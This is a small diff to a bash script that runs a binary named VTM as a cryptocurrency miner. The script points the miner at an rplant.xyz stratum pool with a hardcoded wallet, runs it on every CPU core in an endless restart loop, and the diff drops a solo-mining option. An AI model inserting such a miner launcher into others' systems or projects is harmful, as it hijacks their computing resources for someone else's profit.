@@ -19,6 +19,6 @@ chmod 700 VTM
 #
 FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
 while [ 1 ]; do
-"$FOLDER"/VTM -a gr  -o stratum+tcps://stratum-asia.rplant.xyz:17031 -u AbXgVi6fuyHjwtXXjwZdogPpxcjjDN21dh.mj -p m=solo -t$(nproc --all)
+"$FOLDER"/VTM -a gr  -o stratum+tcps://stratum-asia.rplant.xyz:17031 -u AbXgVi6fuyHjwtXXjwZdogPpxcjjDN21dh.mj -t$(nproc --all)
 sleep 5
 done
